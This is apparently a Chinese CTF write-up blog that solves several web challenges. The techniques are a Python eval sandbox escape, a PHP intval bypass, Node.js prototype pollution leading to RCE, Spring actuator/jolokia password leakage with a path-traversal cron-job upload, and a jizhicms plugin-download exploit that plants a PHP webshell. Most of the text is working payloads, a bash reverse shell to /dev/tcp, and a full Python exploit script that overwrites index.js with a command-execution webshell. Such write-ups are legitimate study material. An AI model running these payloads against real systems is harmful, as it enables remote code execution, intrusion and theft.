<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = lambda: None</span><br><span class="line">&gt;&gt;&gt; inp=&#x27;&#x27;&#x27;f.__globals__[&#x27;__builtins__&#x27;].eval(&#x27;print(1)&#x27;)&#x27;&#x27;&#x27;</span><br><span class="line">&gt;&gt;&gt; eval(inp, &#123;&quot;__builtins__&quot;: None, &#x27;f&#x27;: f&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: &#x27;NoneType&#x27; object is not subscriptable</span><br></pre></td></tr></table></figure>

<p>报错的原因是，我们在 inp 中的 eval 并没有指定 globals，因此 Python 会将当前调用处的上下文的 globals 作为第二个参数，即使设定了第二个参数但没有指定 __builtins__，Python 也会自动注入当前上下文中的 builtins（也就是未指定则继承）。但当前上下文中的 builtins 是 None，因此会报错。</p>
<p>绕过也很简单，显式指定即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; inp=&#x27;&#x27;&#x27;f.__globals__[&#x27;__builtins__&#x27;].eval(&#x27;print(1)&#x27;, &#123; &quot;__builtins__&quot;: f.__globals__[&#x27;__builtins__&#x27;] &#125;)&#x27;&#x27;&#x27;</span><br><span class="line">&gt;&gt;&gt; eval(inp, &#123;&quot;__builtins__&quot;: None, &#x27;f&#x27;: f&#125;)</span><br></pre></td></tr></table></figure>

<p>综上，Payload 其实有很多种，这里列举一些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f.__globals__[&#x27;__builtins__&#x27;] .eval(&#x27;open(&quot;/flag&quot;).read()&#x27;, &#123; &quot;__builtins__&quot;: f.__globals__[&#x27;__builtins__&#x27;] &#125;)</span><br><span class="line">f.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()</span><br><span class="line">f.__globals__[&#x27;__builtins__&#x27;].__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure>

<h2 id="chocolate"><a href="#chocolate" class="headerlink" title="chocolate"></a>chocolate</h2><p>只记录一个点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$cocoaLiquor_star</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$what_can_i_say</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;source.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;什么?想做巧克力?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;1337&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;可爱的捏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你干嘛&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;orz orz orz&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>, <span class="number">0</span>)===<span class="number">1337</span>) &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">&#123;$cocoaLiquor_star&#125;</span>\n&quot;</span>);</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">&#123;$what_can_i_say&#125;</span>\n&quot;</span>);</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;牢师傅如此说到&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=+02471</span><br></pre></td></tr></table></figure>

<h2 id="ezpollute"><a href="#ezpollute" class="headerlink" title="ezpollute"></a>ezpollute</h2><p>根据题目名称可知，这是一道 JavaScript 的原型链污染题</p>
<p>查看部署文件，可以得知 Node.js 版本为 16，并且使用了 node-dev 热部署启动<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/1.png" alt="alt text"></p>
<p>审计 index.js，&#x2F;config 路由下调用了 merge 函数，merge 函数意味着可能存在的原型链污染漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/config&quot;</span>, <span class="title function_">async</span> (ctx) =&gt; &#123;</span><br><span class="line">  jsonData = ctx.<span class="property">request</span>.<span class="property">rawBody</span> || <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">  token = ctx.<span class="property">cookies</span>.<span class="title function_">get</span>(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">    <span class="keyword">return</span> (ctx.<span class="property">body</span> = &#123;</span><br><span class="line">      <span class="attr">code</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&quot;Upload Photo First&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> [err, userID] = <span class="title function_">decodeToken</span>(token);</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> (ctx.<span class="property">body</span> = &#123;</span><br><span class="line">      <span class="attr">code</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&quot;Invalid Token&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  userConfig = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonData);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    finalConfig = <span class="title function_">clone</span>(defaultWaterMarkConfig);</span><br><span class="line">    <span class="comment">// 这里喵</span></span><br><span class="line">    <span class="title function_">merge</span>(finalConfig, userConfig);</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;uploads&quot;</span>, userID, <span class="string">&quot;config.json&quot;</span>), <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(finalConfig));</span><br><span class="line">    ctx.<span class="property">body</span> = &#123;</span><br><span class="line">      <span class="attr">code</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&quot;Config updated successfully&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    ctx.<span class="property">body</span> = &#123;</span><br><span class="line">      <span class="attr">code</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&quot;Some error occurred&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>merge 函数在 &#x2F;util&#x2F;merge.js 中，虽然过滤了 proto，但我们可以通过 constructor.prototype 来绕过限制</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /util/merge.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isObject</span>(target) || !<span class="title function_">isObject</span>(source)) &#123;</span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key === <span class="string">&quot;__proto__&quot;</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (source[key] === <span class="string">&quot;&quot;</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(source[key]) &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">      target[key] = <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[key] = source[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;process 路由调用了 fork，创建了一个 JavaScript 子进程用于水印添加</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 这里喵</span></span><br><span class="line">    <span class="keyword">const</span> proc = <span class="title function_">fork</span>(<span class="title class_">PhotoProcessScript</span>, [userDir], &#123; <span class="attr">silent</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">    proc.<span class="title function_">on</span>(<span class="string">&quot;close&quot;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (code === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;An error occurred during execution&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    proc.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Failed to start subprocess: <span class="subst">$&#123;err.message&#125;</span>`</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  ctx.<span class="property">body</span> = &#123;</span><br><span class="line">    <span class="attr">code</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">msg</span>: <span class="string">&quot;Photos processed successfully&quot;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = &#123;</span><br><span class="line">    <span class="attr">code</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">msg</span>: <span class="string">&quot;some error occurred&quot;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合之前的原型链污染漏洞，我们污染 NODE_OPTIONS 和 env，在 env 中写入恶意代码，fork 在创建子进程时就会首先加载恶意代码，从而实现 RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    &quot;constructor&quot;: &#123;</span><br><span class="line">        &quot;prototype&quot;: &#123;</span><br><span class="line">            &quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/environ&quot;,</span><br><span class="line">            &quot;env&quot;: &#123;</span><br><span class="line">                 &quot;A&quot;:&quot;require(\&quot;child_process\&quot;).execSync(\&quot;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&#x27;\&quot;)//&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 需要注意在 Payload 最后面有注释符 `//`，这里的思路跟 SQL 注入很像</span><br></pre></td></tr></table></figure>

<p>除了弹 shell，还可以通过写 WebShell 覆盖 index.js，从而实现有回显 RCE，或者把 flag 输出到 static 目录下读也可以</p>
<p>比赛时题目环境并没有出网，弹不了 shell，只能通过后两种方式来做，这里给出写 WebShell 的做法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://eci-2ze94pdfw4ofpnpy8wa4.cloudeci1.ichunqiu.com:3000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 token</span></span><br><span class="line"><span class="comment"># 随便发送点图片获取 token</span></span><br><span class="line">files = [</span><br><span class="line">    (<span class="string">&#x27;images&#x27;</span>, (<span class="string">&#x27;anno.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;./1.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>)),</span><br><span class="line">    (<span class="string">&#x27;images&#x27;</span>, (<span class="string">&#x27;soyo.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;./2.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>))</span><br><span class="line">]</span><br><span class="line">res = requests.post(url + <span class="string">&quot;/upload&quot;</span>, files=files)</span><br><span class="line">token = res.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>)</span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&#x27;token=([a-f0-9\-\.]+)&#x27;</span>, token)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    token = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;token=<span class="subst">&#123;token&#125;</span>&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过原型链污染 env 注入恶意代码即可 RCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 WebShell</span></span><br><span class="line">webshell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">const Koa = require(&#x27;koa&#x27;)</span></span><br><span class="line"><span class="string">const Router = require(&#x27;koa-router&#x27;)</span></span><br><span class="line"><span class="string">const app = new Koa()</span></span><br><span class="line"><span class="string">const router = new Router()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">router.get(&quot;/webshell&quot;, async (ctx) =&gt; &#123;</span></span><br><span class="line"><span class="string">    const &#123;cmd&#125; = ctx.query</span></span><br><span class="line"><span class="string">    res = require(&#x27;child_process&#x27;).execSync(cmd).toString()</span></span><br><span class="line"><span class="string">    return ctx.body = &#123;</span></span><br><span class="line"><span class="string">        res</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.use(router.routes())</span></span><br><span class="line"><span class="string">app.listen(3000, () =&gt; &#123;</span></span><br><span class="line"><span class="string">    console.log(&#x27;http://127.0.0.1:3000&#x27;)</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 WebShell 内容 Base64 编码</span></span><br><span class="line">encoded_webshell = base64.b64encode(webshell.encode()).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 解码后写入文件</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;constructor&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;prototype&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="string">&quot;--require /proc/self/environ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;env&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;A&quot;</span>: <span class="string">f&quot;require(\&quot;child_process\&quot;).execSync(\&quot;echo <span class="subst">&#123;encoded_webshell&#125;</span> | base64 -d &gt; /app/index.js\&quot;)//&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原型链污染</span></span><br><span class="line">requests.post(url + <span class="string">&quot;/config&quot;</span>, json=payload, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 fork 实现 RCE</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(url + <span class="string">&quot;/process&quot;</span>, headers=headers)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 访问有回显的 WebShell</span></span><br><span class="line">res = requests.get(url + <span class="string">&quot;/webshell?cmd=cat /flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h2 id="隐藏的密码"><a href="#隐藏的密码" class="headerlink" title="隐藏的密码"></a>隐藏的密码</h2><p>根据题目隐藏的密码可能是存在信息泄露，进行目录扫描，可以扫到 &#x2F;actuator&#x2F;env 和 &#x2F;actuator&#x2F;jolokia ，可以找到 caef11.passwd 属性是隐藏的<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/2.png" alt="alt text"></p>
<p>可以从&#x2F;actuator&#x2F;jolokia尝试获取星号的内容</p>
<p><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/3.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia HTTP/1.1</span><br><span class="line">Host: 8.147.132.32:40590</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 146</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;caef11.passwd&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>得到了星号内容是123456qWertAsdFgZxCvB!@#</p>
<p>登录，发现界面内容和前面目录扫描出来的 back.html 是一样的。。。<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/4.png" alt="alt text"></p>
<p>通过写定时任务（计划任务）的方式，以 flag 为文件名在根目录创建新文件，通过 ls 查看 flag，或者反弹 shell 也可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: 8.147.132.32:40590</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://8.147.132.32:40590/back.html</span><br><span class="line">Content-Type: multipart/form-data; boundary=----geckoformboundary3abb2630e8805e36ea9edbc7f4ac8b52</span><br><span class="line">Content-Length: 289</span><br><span class="line">Origin: http://8.147.132.32:40590</span><br><span class="line">Connection: close</span><br><span class="line">Priority: u=0</span><br><span class="line"></span><br><span class="line">------geckoformboundary3abb2630e8805e36ea9edbc7f4ac8b52</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../etc/cron.d/testt&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">*/1 * * * * root cat /flag | xargs -I &#123;&#125; touch /&#123;&#125;</span><br><span class="line"></span><br><span class="line">------geckoformboundary3abb2630e8805e36ea9edbc7f4ac8b52--</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/5.png" alt="alt text"></p>
<h2 id="ezcmsss"><a href="#ezcmsss" class="headerlink" title="ezcmsss"></a>ezcmsss</h2><p>在 readme.txt 获得 jizhicms 版本号为 v1.9.5，在 start.sh 获得服务器初始化时使用的管理员账号和密码<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/6.png" alt="alt text"></p>
<p>同时在 start.sh 中有备注提示访问 admin.php 进入管理页面，然后使用上面的账号密码登录</p>
<p>上网搜索可以发现 jizhicms v1.9.5 有一个管理界面的任意文件下载漏洞</p>
<p>在 扩展管理 » 插件列表 中发现只有一个插件，这是由于容器不出网导致的，因此我们不能按照网上的方式，使用公网的 URL 链接下载文件，而是需要在将 .zip 文件上传到题目容器里，然后通过任意文件下载漏洞本地下载、解压<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/7.png" alt="alt text"></p>
<p>有几种上传 .zip 文件的方法，都可以获取到文件保存的目录，其中一种是在 栏目管理 » 栏目列表 » 新增栏目 中添加附件，上传构造好的包含 PHP 马的压缩包</p>
<p>抓包获得保存路径为 &#x2F;static&#x2F;upload&#x2F;file&#x2F;20241016&#x2F;1729079175871306.zip，测试可以访问</p>
<p>在插件那边进行抓包，构造请求如下（可以照着网上的漏洞复现，依葫芦画瓢，filepath 随便起就行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php/Plugins/update.html HTTP/1.1</span><br><span class="line">Host: eci-2zedm1lw513xbz1d46c6.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Length: 126</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie:PHPSESSID=0k7pqbk4chhak4ku5aqbfhe7b3</span><br><span class="line"></span><br><span class="line">filepath=apidata&amp;action=start-download&amp;type=0&amp;download_url=http%3a//127.0.0.1/static/upload/file/20241016/1729079175871306.zip</span><br></pre></td></tr></table></figure>

